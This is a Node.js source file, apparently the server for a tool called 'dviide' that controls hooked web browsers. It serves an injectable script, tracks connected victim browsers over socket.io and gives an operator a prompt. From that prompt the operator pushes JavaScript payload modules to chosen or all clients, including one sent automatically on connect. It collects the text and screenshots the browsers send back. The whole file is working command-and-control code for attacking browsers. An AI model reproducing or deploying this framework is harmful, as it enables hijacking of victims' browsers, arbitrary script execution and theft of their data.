var app = require('express')()
var fs = require('fs')
var http = require('http')
var httpio = require('http').Server()
var io = require('socket.io')(httpio)
var clear = require('cli-clear')
var readline = require('readline')
var path = require('path')
var pjson = require('./package.json')
require('colors')
var clients = []
var modules = []
var commands = []
var olm
var commandHelpers
var rl = readline.createInterface(process.stdin, process.stdout)
io.set('origins', '*:*')

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, '/html/index.html'))
})

app.get('/inject.js', function (req, res) {
  fs.readFile(path.join(__dirname, '/inject.js'), 'utf8', function (err, datainject) {
    if (err) { datainject = null }
    fs.readFile(path.join(__dirname, '/config.json'), 'utf-8', function (err, dataconfig) {
      if (err) { datainject = null }
      res.type('.js')
      res.send('var config = ' + dataconfig + ';' + datainject)
    })
  })
})

io.on('connection', function (socket) {
  socket.on('conn', function (data) {
    checkClient(data, '[C] Client connected with id: '.green + data.id.green.bold, socket)
  })
  socket.on('beat', function (data) {
    checkClient(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket)
  })
  socket.on('callbackText', function (data) {
    var ok = false
    for (var i = 0; i < clients.length; i++) {
      if (clients[i].id === data.id) {
        ok = true
      }
    }
    if (ok) {
      clog('[C] Client: '.green + data.id.green.bold + ' returned data: \n\n----------\n'.green + data.data.green.bold + '----------\n'.green)
    }
  })
  socket.on('callbackImageBase64', function (data) {
    var ok = false
    for (var i = 0; i < clients.length; i++) {
      if (clients[i].id === data.id) {
        ok = true
      }
    }
    if (ok) {
      var imgpath = 'dviide/return/' + data.id + new Date().getTime() + '.png'
      fs.writeFile(imgpath, data.data, 'base64', function (err) {
        if (err) {
          clog(err.red)
        }
      })
      clog('[C] Client: '.green + data.id.green.bold + ' returned image. Saved to: '.green + imgpath.green.bold)
    }
  })
  socket.on('disconnect', function () {
    for (var i = 0; i < clients.length; i++) {
      if (clients[i].socket === socket) {
        clog('\n[C] Client: '.red + clients[i].id.red.bold + ' disconnected!'.red)
        clients.splice(i, 1)
      }
    }
  })
})
clear()
clog(`
  ▓█████▄  ██▒   █▓ ██▓ ██▓▓█████▄ ▓█████
  ▒██▀ ██▌▓██░   █▒▓██▒▓██▒▒██▀ ██▌▓█   ▀
  ░██   █▌ ▓██  █▒░▒██▒▒██▒░██   █▌▒███
  ░▓█▄   ▌  ▒██ █░░░██░░██░░▓█▄   ▌▒▓█  ▄
  ░▒████▓    ▒▀█░  ░██░░██░░▒████▓ ░▒████▒
  ▒▒▓  ▒    ░ ▐░  ░▓  ░▓   ▒▒▓  ▒ ░░ ▒░ ░
  ░ ▒  ▒    ░ ░░   ▒ ░ ▒ ░ ░ ▒  ▒  ░ ░  ░
  ░ ░  ░      ░░   ▒ ░ ▒ ░ ░ ░  ░    ░
  ░          ░   ░   ░     ░       ░  ░
  ░           ░            ░
  `.red.bold
)
clog('Created by @idiidk. Version '.bold.red + pjson.version.bold.red + '.\n'.red.bold)

clog('[L] Starting listener on port 3000...'.yellow)
httpio.listen(3000, function () {
  clog('[L] Started listener and on port 3000'.green)
  clog('[L] Starting webserver on port 3030...'.yellow)
  http.Server(app).listen(3030, function () {
    clog('[L] Started webserver and on port 3030'.green)
    clog('[L] Listening for connections...'.green)
    loadModules(function () {
      loadCommands(function () {
        fs.readFile(path.join(__dirname, '/config.json'), 'utf-8', function (err, dataconfig) {
          if (err) { dataconfig = null }
          commandHelpers = new CommandHelpers(dataconfig)
          initComplete()
        })
      })
    })
  })
})

function Client (id, socket, name) {
  this.id = id
  this.name = name
  this.socket = socket
}

function Module (name, file) {
  this.name = name
  this.file = file
}

function Command (prefix, func) {
  this.prefix = prefix
  this.call = func
}

// Command handling
function handlePromptInput (input) {
  if (input) {
    var args = input.split(' ')
    var found = false
    for (var i = 0; i < commands.length; i++) {
      if (args[0] === commands[i].prefix) {
        commands[i].call(args, commandHelpers)
        found = true
      }
    }
    if (!found) {
      clog('[C] Command: '.red + args[0].toString().red.bold + ' not found.'.red)
    }
  }
}

function prompt () {
  rl.question('> ', function (input) {
    // process.stdout.moveCursor(0, -1)
    // sprocess.stdout.clearLine();
    handlePromptInput(input)
    prompt()
  })
}

function initComplete () {
  prompt()
}

function clog (message) {
  // THANKS TOM ESTEREZ FOR THIS AWESOME SOLUTION TO THE PROMPT PROBLEM! https://stackoverflow.com/users/508194/tom-esterez
  readline.cursorTo(process.stdout, 0)
  console.log(message)
  rl.prompt(true)
}

function loadCommands (callback) {
  clog('[C] Loading commands...'.green)
  commands = []
  fs.readdir('dviide/commands/', function (err, cmd) {
    if (err) { cmd = null }
    if (cmd.length > 0) {
      for (var i = 0; i < cmd.length; i++) {
        var filecontents = fs.readFileSync('dviide/commands/' + cmd[i], 'utf8')
        var Tempfunc = new Function(filecontents)
        var tempmod = new Tempfunc()
        commands.push(new Command(tempmod.prefix, tempmod.call))
      }
      clog('[C] Loaded: '.green + commands.length.toString().green.bold + ' commands!'.green)
      callback()
    } else {
      clog('[C] No commands found!'.red)
      callback()
    }
  })
}

function loadModules (callback) {
  clog('[M] Loading module list...'.green)
  modules = []
  fs.readdir('dviide/modules/', function (err, mod) {
    if (err) { mod = null }
    if (mod.length > 0) {
      for (var i = 0; i < mod.length; i++) {
        modules.push(new Module(mod[i], 'dviide/modules/' + mod[i]))
      }
      clog('[M] Loaded: '.green + modules.length.toString().green.bold + ' modules!'.green)
      callback()
    } else {
      clog('[M] No modules found!'.red)
      callback()
    }
  })
}
// Object passed to commands to interact with framework
function CommandHelpers (dataconfig) {
  this.config = JSON.parse(dataconfig)
  this.clients = clients
  this.commands = commands
  this.sendModuleToAllClients = function (mname) {
    this.getModuleContentsByName(mname, function (data) {
      for (var i = 0; i < clients.length; i++) {
        clients[i].socket.emit('command', {script: data})
        clog('[M] Sent payload to: '.green + clients[i].id.green.bold)
      }
    })
  }

  this.sendModuleByIdNum = function (mname, idnum) {
    this.getModuleContentsByName(mname, function (data) {
      if (clients[idnum]) {
        for (var i = 0; i < clients.length; i++) {
          if (i === idnum) {
            clients[i].socket.emit('command', {script: data})
            clog('[M] Sent payload to: '.green + clients[i].id.green.bold)
          }
        }
      } else {
        clog('[M] Error client with num: '.red + idnum.toString().red.bold + ' does not seem to exist'.red)
      }
    })
  }

  this.sendModuleById = function (mname, id) {
    this.getModuleContentsByName(mname, function (data) {
      for (var i = 0; i < clients.length; i++) {
        if (clients[i].id === id) {
          clients[i].socket.emit('command', {script: data})
          clog('[M] Sent payload to: '.green + clients[i].id.green.bold)
        }
      }
    })
  }

  this.sendModuleBySocket = function (mname, socket) {
    this.getModuleContentsByName(mname, function (data) {
      socket.emit('command', {script: data})
    })
  }

  this.getModuleContentsByName = function (name, callback) {
    if (this.findModuleByName(name) !== -1) {
      fs.readFile(modules[this.findModuleByName(name)].file, 'utf8', function (err, data) {
        if (err) { data = null }
        callback(data)
      })
    } else {
      clog('[M] Module does not seem to be loaded: '.red + name.red.bold)
      return ''
    }
  }

  this.findModuleByName = function (name) {
    for (var i = 0; i < modules.length; i++) {
      if (modules[i].name.indexOf(name) !== -1) {
        return i
      }
    }
    return -1
  }

  this.clog = function (message) {
    // THANKS TOM ESTEREZ FOR THIS AWESOME SOLUTION TO THE PROMPT PROBLEM! https://stackoverflow.com/users/508194/tom-esterez
    readline.cursorTo(process.stdout, 0)
    console.log(message)
    rl.prompt(true)
  }
  this.require = require
  this.varStorage = []
  this.varAdd = function (name, variable) {
    this.varStorage.push({name: name, variable: variable})
  }
  this.varRet = function (name) {
    for (var i = 0; i < this.varStorage.length; i++) {
      if (this.varStorage[i].name === name) {
        return this.varStorage[i].variable
      }
    }
  }
  this.varDel = function (name) {
    for (var i = 0; i < this.varStorage.length; i++) {
      if (this.varStorage[i].name === name) {
        return this.varStorage.splice(i, 1)
      }
    }
  }
  this.setOnLoad = function (name) {
    olm = name
  }
}

function checkClient (data, message, socket) {
  var ok = false
  for (var i = 0; i < clients.length; i++) {
    if (clients[i].socket === socket) {
      ok = true
    } else if (clients[i].id === data.id) {
      clog('[C] Client: '.red + data.id.red.bold + ' is maybe trying something a little bit sketchy. This client was removed.'.red)
      clients.splice(i, 1)
    }
  }
  // If all ok, add the client.
  if (!ok) {
    clog(message)
    clients.push(new Client(data.id, socket))
    if (olm) {
      commandHelpers.sendModuleBySocket(olm, socket)
    }
  } else {
    if (message.indexOf('disconnected') === -1) {
      var comb = []
      comb.id = data.id
      comb.socket = socket
      clients.push(new Client(data.id, socket))
    }
  }
}
